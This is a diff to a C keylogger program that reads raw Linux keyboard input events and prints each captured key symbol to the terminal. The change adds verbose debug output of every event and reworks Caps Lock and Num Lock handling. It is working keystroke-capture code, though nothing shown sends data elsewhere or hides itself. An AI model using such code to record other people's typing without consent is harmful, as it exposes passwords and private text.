@@ -16,6 +16,7 @@
 
 #include "keylogger.h"
 #include "keys.h"
+#include "debug.h"
 
 static void 		sigint(int sig)
 {
@@ -62,28 +63,52 @@ void					keylogger(int keybd, int **key_table)
 	loop = 1;
 	while (loop)
 	{
+		printf("CAPSLOCK %s\n", (capslock) ? "ON" : "OFF");
+		printf("NUMLOCK %s\n", (numlock) ? "ON" : "OFF");
+		value = state = 0;
 		nbread = read(keybd, events, sizeof(struct input_event) * 128);
+		printf("---------------------------------------------------------\n");
 		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
 		{
-			if (events[i].type == EV_LED) {
-				if (events[i].code == LED_CAPSL) {
-					capslock = events[i].value;
-					if (capslock)
-						modifier += ((1 << modifiers[0].bit));
-					else
-						modifier -= ((1 << modifiers[0].bit));
-				}
-				else if (events[i].code == LED_NUML)
-					numlock = events[i].value;
-				(void)numlock;
-			}
-			else if (events[i].type == EV_KEY) {
+			if (events[i].type == EV_KEY) {
 				value = events[i].code;
 				state = events[i].value;
 			}
+			printf("[%s] ", event[events[i].type].name);
+			if (events[i].type == EV_KEY) {
+				printf("%s ", key[events[i].code].name);
+				printf("%s ", (events[i].value == 0) ? "OFF" : (events[i].value == 1) ? "ON" : " REPEAT");
+			}
+			else if (events[i].type == EV_MSC) {
+				printf("%s ", msc[events[i].code].name);
+				printf("%d ", events[i].value);
+			}
+			else if (events[i].type == EV_LED) {
+				printf("%s ", led[events[i].code].name);
+				printf("%d ", events[i].value);
+			}
+			else {
+				printf("%d ", events[i].code);
+				printf("%d ", events[i].value);
+			}
+			printf("\n");
 		}
 
-		if (value == KEY_LEFTSHIFT || value == KEY_RIGHTSHIFT) {
+		if (value == KEY_CAPSLOCK) {
+			if (state == 1) {
+				capslock = !capslock;
+				if (capslock)
+					modifier += ((1 << modifiers[0].bit));
+				else
+					modifier -= ((1 << modifiers[0].bit));
+			}
+		}
+		else if (value == KEY_NUMLOCK) {
+			if (state == 1) {
+				numlock = !numlock;
+			}
+		}
+		else if (value == KEY_LEFTSHIFT || value == KEY_RIGHTSHIFT) {
 			if (capslock)
 				state = !state;
 			if (state == 0)
@@ -118,5 +143,6 @@ void					keylogger(int keybd, int **key_table)
 			print_keysym(key_table[value][modifier]);
 			fflush(stdout);
 		}
+		printf("---------------------------------------------------------\n");
 	}
 }
